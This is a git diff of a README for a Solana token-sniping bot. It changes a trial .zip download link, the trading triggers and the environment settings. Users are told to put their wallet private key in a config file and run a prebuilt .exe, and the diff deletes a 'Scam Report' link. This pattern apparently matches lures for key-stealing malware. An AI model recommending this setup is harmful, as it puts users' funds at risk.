@@ -63,39 +63,35 @@ src/
 ---
 ## Trial Versions
 
-### **Solana RayPump Sniper (Executioner Trial)**  
-> 🗂️ [solana-rust-raypump-sniper(executioner-trial).zip](https://github.com/user-attachments/files/18876781/solana-rust-raypump-sniper.executioner-trial.zip)
+### **Solana PumpRay Sniper (Trial)**  
+> 🗂️ [solana-pumpray-sniper(trial).zip](https://github.com/user-attachments/files/19416260/solana-pumpray-sniper.trial.zip)
 
 **Strategy Details:**
-- **Entry Trigger:** Monitor user purchases of tokens valued at $1,000; execute a buy order upon detection.
-- **Exit Trigger:** Monitor user sales of tokens valued at $300; execute a sell order upon detection.
+- **Entry Trigger:** Monitor user purchases of the new tokens on Dex; execute a buy order upon detection.
+- **Exit Trigger:** Monitor user sales of tokens by checking tp/sl; execute a sell order upon detection.
 - **Time Limitation:** If a position remains open for more than 60 seconds, initiate an automatic sell.  
-*(Note: The $1,000 and $300 purchase/sale thresholds, as well as the 60-second time limit, are adjustable parameters via environment settings.)*
-
+*(Note: The tp/sl, as well as the 60-second time limit, are adjustable parameters via environment settings.)*
 ---
 
 ### How To Run
 1. Environment Variables Settings
 ```plaintext
-PRIVATE_KEY=your_private_key_here
-RPC_HTTPS=https://mainnet.helius-rpc.com/?api-key=your_api_key_here
-RPC_WSS=wss://atlas-mainnet.helius-rpc.com/?api-key=your_api_key_here
+PRIVATE_KEY= # your wallet priv_key
+RPC_API_KEY= #your helius rpc api-key (Please use premium version that has Geyser Enhanced Websocket)
 SLIPPAGE=10
 JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
-JITO_TIP_STREAM_URL=ws://bundles-api-rest.jito.wtf/api/v1/bundles/tip_stream
-JITO_TIP_PERCENTILE=50
-JITO_TIP_VALUE=0.004
-BUY_THRESHOLD=1000
-SELL_THRESHOLD=300
-TIME_EXCEED=60
-TOKEN_AMOUNT=0.000001
+JITO_TIP_VALUE=0.00927
+TIME_EXCEED=60 # seconds; time limit for volume non-increasing
+TOKEN_AMOUNT=0.0000001 # token amount to purchase
+TP=3 #3 times
+SL=0.5 #50 percentage
 ```
 2. Add the wallet address you want to block on a new line and save the file.
 ```
 0x1234567890abcdef1234567890abcdef12345678
 0xabcdef1234567890abcdef1234567890abcdef12
 ```
-3. Run `raypump-executioner-bot.exe`.
+3. Run `solana-pumpray-sniper.exe`.
 
 ![image](https://github.com/user-attachments/assets/dffc8e4b-cd00-4921-8488-e25230f4a31a)
 
@@ -117,7 +113,3 @@ TOKEN_AMOUNT=0.000001
 
 As the experimental result, the best environment for running this bot is to use `dedicated server located in NY`. 
 For support and further inquiries, please connect via Telegram: 📞 [jwest951227](https://t.me/jwest951227).
-
-## Scam Report
-
-https://github.com/Solana-Sniper-Bot-Download/Solana-Raydium-Pumpfun-Sniper-Bot/issues/2
